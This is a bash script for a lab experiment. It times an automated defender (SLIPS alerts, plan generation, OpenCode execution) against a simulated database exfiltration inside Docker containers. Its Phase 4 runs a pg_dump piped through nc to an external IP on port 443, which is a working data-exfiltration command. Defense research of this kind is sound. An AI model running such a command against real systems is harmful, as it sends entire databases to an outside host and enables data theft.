#!/bin/bash
# Data Exfiltration Experiment Script
# Tests defender response to database exfiltration attack
#
# Logs:
# - Time until SLIPS generates high confidence alert
# - Time to plan generation
# - Time until OpenCode execution finishes
# - Time until last byte exfiltrated
#
# Termination conditions:
# 1. Defender has successful OpenCode execution and no bytes received 30s after that
# 2. 15 minutes have passed since exfil command was executed

set -e

# Configuration
EXPERIMENT_ID="${1:-exfil_$(date +%Y%m%d_%H%M%S)}"
MAX_EXPERIMENT_TIME=900  # 15 minutes
PCAP_ROTATE_SECS="${PCAP_ROTATE_SECS:-30}"

# Paths
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
OUTPUTS_DIR="$PROJECT_ROOT/outputs"
EXPERIMENT_OUTPUTS="$OUTPUTS_DIR/$EXPERIMENT_ID"
RUN_ID_FILE="$PROJECT_ROOT/outputs/.current_run"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Logging
log() {
    echo -e "${BLUE}[$(date '+%Y-%m-%d %H:%M:%S')]${NC} $1" | tee -a "$EXPERIMENT_OUTPUTS/logs/experiment.log"
}

log_success() {
    echo -e "${GREEN}[$(date '+%Y-%m-%d %H:%M:%S')] SUCCESS:${NC} $1" | tee -a "$EXPERIMENT_OUTPUTS/logs/experiment.log"
}

log_warning() {
    echo -e "${YELLOW}[$(date '+%Y-%m-%d %H:%M:%S')] WARNING:${NC} $1" | tee -a "$EXPERIMENT_OUTPUTS/logs/experiment.log"
}

log_error() {
    echo -e "${RED}[$(date '+%Y-%m-%d %H:%M:%S')] ERROR:${NC} $1" | tee -a "$EXPERIMENT_OUTPUTS/logs/experiment.log"
}

# Trap for cleanup
cleanup() {
    log "Cleaning up..."

    cd "$PROJECT_ROOT"
    make down 2>/dev/null || true

    log "Cleanup complete"
}

trap cleanup EXIT INT TERM

# Create output directory
mkdir -p "$EXPERIMENT_OUTPUTS"/{pcaps,slips_output,logs}
echo "$EXPERIMENT_ID" > "$RUN_ID_FILE"

log "Starting Data Exfiltration Experiment: $EXPERIMENT_ID"
log "Output directory: $EXPERIMENT_OUTPUTS"

# Phase 1: Start infrastructure
log "=== Phase 1: Starting Infrastructure ==="
cd "$PROJECT_ROOT"

# Set RUN_ID environment variable to match experiment ID
# This ensures all outputs (PCAPs, SLIPS, etc.) go to the same directory
export RUN_ID="$EXPERIMENT_ID"
log "Set RUN_ID environment variable: $RUN_ID"

# Clean up any existing environment
log "Running 'make down' to ensure clean state..."
make down 2>/dev/null || true
sleep 5

# Start core services
log "Running 'make up'..."
make up

# Wait a bit for core services
log "Waiting for core services (10s)..."
sleep 10

# Verify core services are healthy (server HTTP)
log "Checking core services health..."
if ! docker exec lab_compromised curl -sf -o /dev/null http://172.31.0.10:80; then
    log_error "Server not reachable from compromised"
    exit 1
fi
log_success "Core services are healthy!"

# Wait for database to be fully loaded
log "Waiting for database to finish loading..."
max_wait=600  # 10 minutes max
elapsed=0
while [ $elapsed -lt $max_wait ]; do
    employee_count=$(docker exec lab_server runuser -u postgres -- psql -d labdb -tAc "SELECT COUNT(*) FROM employee;" 2>/dev/null || echo "0")
    if [ "$employee_count" -gt 0 ]; then
        log_success "Database loaded! ($employee_count employee records)"
        break
    fi
    sleep 10
    elapsed=$((elapsed + 10))
    if [ $((elapsed % 60)) -eq 0 ]; then
        log "Still waiting for database... (${elapsed}s elapsed)"
    fi
done

if [ $elapsed -ge $max_wait ]; then
    log_error "Database failed to load within ${max_wait}s"
    exit 1
fi

# Phase 2: Start defender (skip if SKIP_DEFENDER is set)
if [[ "$SKIP_DEFENDER" == "true" ]]; then
    log "=== Phase 2: SKIPPING Defender (baseline mode) ==="

    # Set RUN_ID to match our experiment ID so all outputs go to the same directory
    log "Setting RUN_ID to match experiment ID: $EXPERIMENT_ID"
    echo "$EXPERIMENT_ID" > "$RUN_ID_FILE"

    log "Defender disabled - running in baseline mode (no automated response)"
    log_success "Baseline mode configured!"
else
    log "=== Phase 2: Starting Defender ==="

    # Set RUN_ID to match our experiment ID so all outputs go to the same directory
    log "Setting RUN_ID to match experiment ID: $EXPERIMENT_ID"
    echo "$EXPERIMENT_ID" > "$RUN_ID_FILE"

    log "Running 'make defend'..."
    make defend

    # Wait for defender to be ready
    log "Waiting for defender to be ready..."
    if ! make verify; then
        log_error "Defender failed health checks"
        exit 1
    fi
    log_success "Defender is ready!"
fi

# Phase 3: Start exfiltration monitoring
log "=== Phase 3: Starting Exfiltration Monitoring ==="

# Copy monitoring script to router
docker cp "$SCRIPT_DIR/exfiltration_monitor.sh" lab_router:/tmp/exfiltration_monitor.sh
docker exec lab_router chmod +x /tmp/exfiltration_monitor.sh

# Start monitoring in background using nohup inside the container
# The script will run inside the container and write to monitoring.json
docker exec lab_router bash -c "nohup /tmp/exfiltration_monitor.sh /tmp/exfil/monitoring.json > /tmp/exfil_monitor_stdout.log 2>&1 &"
log "Exfiltration monitoring started in router container"

# Phase 4: Start exfiltration attack
log "=== Phase 4: Starting Data Exfiltration Attack ==="

EXFIL_START_TIME=$(date +%s)
log "Exfiltration start time: $(date -Iseconds)"

# Execute exfiltration command in background
# This simulates an attacker exfiltrating the database
log "Executing: pg_dump | nc to exfil server..."
docker exec lab_server su - postgres -c 'pg_dump -U postgres labdb | nc -w 600 137.184.126.86 443' > "$EXPERIMENT_OUTPUTS/logs/exfil_command.log" 2>&1 &
EXFIL_PID=$!

log "Exfiltration command started (PID: $EXFIL_PID)"

# Phase 5: Monitor for experiment end conditions
log "=== Phase 5: Monitoring Experiment Progress ==="

# Variables to track experiment state
high_confidence_alert_time=""
first_plan_time=""
first_successful_exec_time=""
last_byte_time=""
exfil_complete_time=""
experiment_end_reason=""

log "Monitoring experiment progress (max ${MAX_EXPERIMENT_TIME}s)..."
log "Will terminate when:"
log "  1. BOTH: Exfiltration complete (no new bytes for 30s) AND defender OpenCode execution complete"
log "  2. OR ${MAX_EXPERIMENT_TIME}s have passed since exfil command was executed"

# Monitoring loop
while true; do
    current_time=$(date +%s)
    elapsed=$((current_time - EXFIL_START_TIME))

    # Check timeout
    if [[ $elapsed -ge $MAX_EXPERIMENT_TIME ]]; then
        log_warning "Experiment timeout (${MAX_EXPERIMENT_TIME}s elapsed)"
        experiment_end_reason="timeout"
        break
    fi

    # Check exfiltration monitoring status first (needed for termination logic)
    exfil_status=$(docker exec lab_router cat /tmp/exfil/monitoring.json 2>/dev/null | grep -o '"final_status":"[^"]*"' | cut -d'"' -f4 | tail -1)

    # Parse defender timeline for key events
    # The timeline is in the EXPERIMENT_OUTPUTS directory since we set RUN_ID to match
    defender_timeline="$EXPERIMENT_OUTPUTS/auto_responder_timeline.jsonl"

    if [[ -f "$defender_timeline" ]]; then
        # Check for high confidence alert (threshold >= 0.8 or "high" in alert)
        if [[ -z "$high_confidence_alert_time" ]]; then
            high_conf_alert=$(grep -i '"level":"ALERT"' "$defender_timeline" | \
                grep -i 'threat level: high' | head -1 || true)

            if [[ -n "$high_conf_alert" ]]; then
                high_confidence_alert_time=$(echo "$high_conf_alert" | grep -o '"ts":"[^"]*"' | cut -d'"' -f4)
                log "High confidence alert detected at: $high_confidence_alert_time"
            fi
        fi

        # Check for first plan generation
        if [[ -z "$first_plan_time" ]]; then
            first_plan=$(grep '"level":"PLAN"' "$defender_timeline" | head -1 || true)

            if [[ -n "$first_plan" ]]; then
                first_plan_time=$(echo "$first_plan" | grep -o '"ts":"[^"]*"' | cut -d'"' -f4)
                log "Plan generated at: $first_plan_time"
            fi
        fi

        # Check for first successful OpenCode execution
        if [[ -z "$first_successful_exec_time" ]]; then
            successful_exec=$(grep '"level":"EXEC"' "$defender_timeline" | \
                grep -i 'success' | head -1 || true)

            if [[ -n "$successful_exec" ]]; then
                first_successful_exec_time=$(echo "$successful_exec" | grep -o '"ts":"[^"]*"' | cut -d'"' -f4)
                log "OpenCode execution succeeded at: $first_successful_exec_time"

                # Check if exfiltration is already complete
                if [[ "$exfil_status" == "success" ]]; then
                    log "✓ Exfiltration already complete, both conditions met"
                    experiment_end_reason="both_complete"
                    break
                fi

                # Start the post-exec wait timer
                POST_EXEC_START_TIME=$(date +%s)
            fi
        fi
    fi

    # Check exfiltration monitoring for completion
    if [[ "$exfil_status" == "success" && -z "$exfil_complete_time" ]]; then
        # Extract the completion timestamp - the line that has "end_time" key
        exfil_complete_time=$(docker exec lab_router cat /tmp/exfil/monitoring.json 2>/dev/null | grep '"end_time"' | grep -o '"end_time":"[^"]*"' | cut -d'"' -f4 | tail -1)
        last_byte_time="$exfil_complete_time"
        log "✓ Exfiltration complete at: ${exfil_complete_time:-unknown}"

        # Check if we already have OpenCode execution complete
        if [[ -n "$first_successful_exec_time" ]]; then
            log "✓ OpenCode execution already completed at: $first_successful_exec_time"
            log "Termination condition met: BOTH exfiltration AND defender execution complete"
            experiment_end_reason="both_complete"
            break
        else
            log "Waiting for OpenCode execution to complete..."
        fi
    elif [[ "$exfil_status" == "success" && -n "$exfil_complete_time" && -n "$first_successful_exec_time" ]]; then
        # Both conditions met
        log "✓ OpenCode execution completed at: $first_successful_exec_time"
        log "Termination condition met: BOTH exfiltration AND defender execution complete"
        experiment_end_reason="both_complete"
        break
    elif [[ "$exfil_status" == "timeout_no_data" || "$exfil_status" == "timeout_no_file" ]]; then
        log_warning "Exfiltration monitoring reported timeout: $exfil_status"
        experiment_end_reason="exfil_timeout"
        break
    fi

    # Progress update every 30 seconds
    if [[ $((elapsed % 30)) -eq 0 && $elapsed -gt 0 ]]; then
        log "Progress: ${elapsed}s elapsed"

        # Show what we're still waiting for
        if [[ -z "$high_confidence_alert_time" ]]; then
            log "  ⏳ Waiting for: High confidence alert"
        else
            log "  ✓ High confidence alert: $high_confidence_alert_time"
        fi

        if [[ -z "$first_plan_time" ]]; then
            log "  ⏳ Waiting for: Plan generation"
        else
            log "  ✓ Plan generated: $first_plan_time"
        fi

        if [[ -z "$first_successful_exec_time" ]]; then
            log "  ⏳ Waiting for: OpenCode execution"
        else
            log "  ✓ OpenCode exec: $first_successful_exec_time"
        fi

        if [[ "$exfil_status" != "success" ]]; then
            log "  ⏳ Waiting for: Exfiltration to complete"
        else
            log "  ✓ Exfiltration complete"
        fi
    fi

    sleep 5
done

# Phase 6: Collect results
log "=== Phase 6: Collecting Results ==="

EXPERIMENT_END_TIME=$(date +%s)
TOTAL_DURATION=$((EXPERIMENT_END_TIME - EXFIL_START_TIME))

log "Experiment ended: $(date -Iseconds)"
log "Total duration: ${TOTAL_DURATION}s"
log "End reason: $experiment_end_reason"

# Wait for all logs to be written
sleep 10

# Copy defender timeline and detailed logs from the RUN_ID directory
# Since we set RUN_ID to match EXPERIMENT_ID, these should be in the same place
if [[ -f "$EXPERIMENT_OUTPUTS/auto_responder_timeline.jsonl" ]]; then
    cp "$EXPERIMENT_OUTPUTS/auto_responder_timeline.jsonl" "$EXPERIMENT_OUTPUTS/logs/"
    log "Defender timeline copied"
fi
if [[ -f "$EXPERIMENT_OUTPUTS/auto_responder_detailed.log" ]]; then
    cp "$EXPERIMENT_OUTPUTS/auto_responder_detailed.log" "$EXPERIMENT_OUTPUTS/logs/"
    log "Defender detailed log copied"
fi

# Also copy SLIPS output directory (if it exists in the outputs directory)
if [[ -d "$EXPERIMENT_OUTPUTS/slips" ]]; then
    cp -r "$EXPERIMENT_OUTPUTS/slips" "$EXPERIMENT_OUTPUTS/logs/"
    log "SLIPS output copied"
fi

# Copy exfiltration monitoring results
docker cp lab_router:/tmp/exfil/monitoring.json "$EXPERIMENT_OUTPUTS/logs/" 2>/dev/null || true
docker cp lab_router:/tmp/exfil/labdb_dump.sql "$EXPERIMENT_OUTPUTS/logs/" 2>/dev/null || true
docker cp lab_router:/tmp/exfil/nc.log "$EXPERIMENT_OUTPUTS/logs/" 2>/dev/null || true
log "Exfiltration results copied"

# Collect PCAPs
log "PCAPs saved in: $EXPERIMENT_OUTPUTS/pcaps"

# Phase 7: Generate summary
log "=== Phase 7: Generating Summary ==="

# Calculate timestamps in seconds since epoch
if [[ -n "$EXFIL_START_TIME" ]]; then
    exfil_start_iso=$(date -d @$EXFIL_START_TIME -Iseconds 2>/dev/null || echo "$EXPERIMENT_START_TIME")
else
    exfil_start_iso=$(date -Iseconds)
fi

# Convert ISO timestamps to epoch seconds for calculations
to_epoch() {
    local iso="$1"
    if [[ -n "$iso" ]]; then
        date -d "$iso" +%s 2>/dev/null || echo "0"
    else
        echo "0"
    fi
}

high_conf_epoch=$(to_epoch "$high_confidence_alert_time")
plan_epoch=$(to_epoch "$first_plan_time")
exec_epoch=$(to_epoch "$first_successful_exec_time")
last_byte_epoch=$(to_epoch "$last_byte_time")

# Calculate deltas
time_to_high_conf=""
time_to_plan=""
time_to_exec=""
time_to_last_byte=""
time_to_exfil_complete=""

if [[ $high_conf_epoch -gt 0 ]]; then
    time_to_high_conf=$((high_conf_epoch - EXFIL_START_TIME))
fi

if [[ $plan_epoch -gt 0 ]]; then
    time_to_plan=$((plan_epoch - EXFIL_START_TIME))
fi

if [[ $exec_epoch -gt 0 ]]; then
    time_to_exec=$((exec_epoch - EXFIL_START_TIME))
fi

if [[ $last_byte_epoch -gt 0 ]]; then
    time_to_last_byte=$((last_byte_epoch - EXFIL_START_TIME))
fi

# Get final exfil file size
exfil_file="$EXPERIMENT_OUTPUTS/logs/labdb_dump.sql"
final_exfil_size="0"
final_exfil_size_human="0 bytes"

if [[ -f "$exfil_file" ]]; then
    final_exfil_size=$(stat -c%s "$exfil_file" 2>/dev/null || echo "0")
    final_exfil_size_human=$(numfmt --to=si $final_exfil_size 2>/dev/null || echo "${final_exfil_size} bytes")

    # Check if defender failed (exfiltrated >= 2.8GB which is the baseline)
    # Baseline is 2.8GB (2,920,249,784 bytes from our no-defender tests)
    if [[ $final_exfil_size -ge 2800000000 ]]; then
        log_warning "⚠️ DEFENDER FAILURE: Exfiltrated ${final_exfil_size_human} >= 2.8GB baseline!"
        log_warning "⚠️ This indicates the defender did NOT block the exfiltration"
        defender_failed="true"
    else
        defender_failed="false"
    fi
fi

# Get high confidence alert details
high_conf_alert_details=""
if [[ -f "$EXPERIMENT_OUTPUTS/logs/auto_responder_timeline.jsonl" ]]; then
    high_conf_alert_details=$(grep -i '"level":"ALERT"' "$EXPERIMENT_OUTPUTS/logs/auto_responder_timeline.jsonl" | \
        grep -i 'threat level: high' | head -1 | jq -c '.data.full_alert // .msg' 2>/dev/null || echo "null")
fi

# ===== NEW: Analyze blocking timing from monitoring data =====
blocked_mid_transfer="false"
block_time_seconds=""
time_from_opencode_start_to_block=""
transfer_speed_mbps=""
transfer_duration_seconds=""
bytes_saved_from_exfil=""

if [[ -f "$EXPERIMENT_OUTPUTS/logs/monitoring.json" ]]; then
    # Find the first timestamp when file size became stable (block occurred)
    first_stable=$(grep '"size_stable"' "$EXPERIMENT_OUTPUTS/logs/monitoring.json" | head -1 | jq -r '.timestamp')
    last_growth=$(grep '"file_growing"' "$EXPERIMENT_OUTPUTS/logs/monitoring.json" | tail -1 | jq -r '.timestamp')

    if [[ -n "$first_stable" && -n "$last_growth" ]]; then
        block_epoch=$(to_epoch "$first_stable")
        last_growth_epoch=$(to_epoch "$last_growth")

        # Calculate when the block was confirmed
        if [[ $block_epoch -gt $EXFIL_START_TIME ]]; then
            block_time_seconds=$((block_epoch - EXFIL_START_TIME))

            # Check if block occurred before OpenCode finished
            if [[ $exec_epoch -gt 0 && $block_epoch -lt $exec_epoch ]]; then
                blocked_mid_transfer="true"
                time_from_opencode_start_to_block=$((block_epoch - high_conf_epoch))
            fi
        fi

        # Calculate actual transfer duration (from start to last growth)
        if [[ $last_growth_epoch -gt $EXFIL_START_TIME ]]; then
            transfer_duration_seconds=$((last_growth_epoch - EXFIL_START_TIME))
        fi

        # Calculate transfer speed
        if [[ $final_exfil_size -gt 0 && $transfer_duration_seconds -gt 0 ]]; then
            # Speed in Mbps = (bytes * 8) / (seconds * 1,000,000)
            speed_mbps=$(echo "scale=1; $final_exfil_size * 8 / $transfer_duration_seconds / 1000000" | bc 2>/dev/null || echo "0")
            transfer_speed_mbps="${speed_mbps} Mbps"
        fi

        # Estimate bytes saved (total DB size minus exfiltrated)
        # This is approximate - we'd need actual DB size for precise calculation
        bytes_saved_from_exfil="unknown"
    fi
fi

# Create JSON summary
cat > "$EXPERIMENT_OUTPUTS/exfil_experiment_summary.json" << EOF
{
    "experiment_id": "$EXPERIMENT_ID",
    "exfiltration_start_time": "$exfil_start_iso",
    "experiment_end_time": "$(date -Iseconds)",
    "total_duration_seconds": $TOTAL_DURATION,
    "end_reason": "$experiment_end_reason",
    "metrics": {
        "time_to_high_confidence_alert_seconds": ${time_to_high_conf:-null},
        "high_confidence_alert_time": "${high_confidence_alert_time:-null}",
        "high_confidence_alert_details": ${high_conf_alert_details:-null},
        "time_to_plan_generation_seconds": ${time_to_plan:-null},
        "plan_generation_time": "${first_plan_time:-null}",
        "time_to_opencode_execution_seconds": ${time_to_exec:-null},
        "opencode_execution_time": "${first_successful_exec_time:-null}",
        "time_to_last_byte_seconds": ${time_to_last_byte:-null},
        "last_byte_time": "${last_byte_time:-null}",
        "exfil_file_size_bytes": $final_exfil_size,
        "exfil_file_size_human": "$final_exfil_size_human",
        "defender_failed": ${defender_failed:-false},
        "blocking_analysis": {
            "blocked_mid_transfer": $blocked_mid_transfer,
            "block_time_seconds": ${block_time_seconds:-null},
            "time_from_opencode_start_to_block_seconds": ${time_from_opencode_start_to_block:-null},
            "transfer_duration_seconds": ${transfer_duration_seconds:-null},
            "transfer_speed": "$transfer_speed_mbps",
            "bytes_saved_from_exfiltration": "${bytes_saved_from_exfil:-null}"
        }
    }
}
EOF

# Print summary
log ""
log "=== Experiment Summary ==="
log "Experiment ID: $EXPERIMENT_ID"
log "End Reason: $experiment_end_reason"
log "Total Duration: ${TOTAL_DURATION}s"
log ""
log "Timing Metrics:"
log "  - Time to high confidence alert: ${time_to_high_conf:-N/A}s"
log "  - Time to plan generation: ${time_to_plan:-N/A}s"
log "  - Time to OpenCode execution: ${time_to_exec:-N/A}s"
log "  - Time to last byte: ${time_to_last_byte:-N/A}s"
log ""
log "Exfiltration Data:"
log "  - Final file size: $final_exfil_size_human"
if [[ "$blocked_mid_transfer" == "true" ]]; then
    log ""
    log "Blocking Analysis:"
    log "  ✓ BLOCKED MID-TRANSFER"
    log "  - Block occurred at: ${block_time_seconds}s after exfiltration start"
    log "  - Time from OpenCode start to block: ${time_from_opencode_start_to_block}s"
    log "  - Transfer duration: ${transfer_duration_seconds}s"
    log "  - Transfer speed: $transfer_speed_mbps"
    log "  - Data saved: ${bytes_saved_from_exfil:-unknown}"
elif [[ -n "$transfer_duration_seconds" ]]; then
    log ""
    log "Transfer Analysis:"
    log "  - Transfer duration: ${transfer_duration_seconds}s"
    log "  - Transfer speed: $transfer_speed_mbps"
fi
log ""
log "Results saved in: $EXPERIMENT_OUTPUTS"
log "Summary saved in: $EXPERIMENT_OUTPUTS/exfil_experiment_summary.json"

log_success "Experiment complete!"

# Delete PCAPs to save disk space (they're large and not needed for analysis)
log "Deleting PCAPs to save disk space..."
rm -rf "$EXPERIMENT_OUTPUTS/pcaps" 2>/dev/null || true
# Also delete PCAPs from the original outputs directory
rm -rf "/home/diego/Trident/outputs/$EXPERIMENT_ID/pcaps" 2>/dev/null || true
log "PCAPs deleted"

exit 0
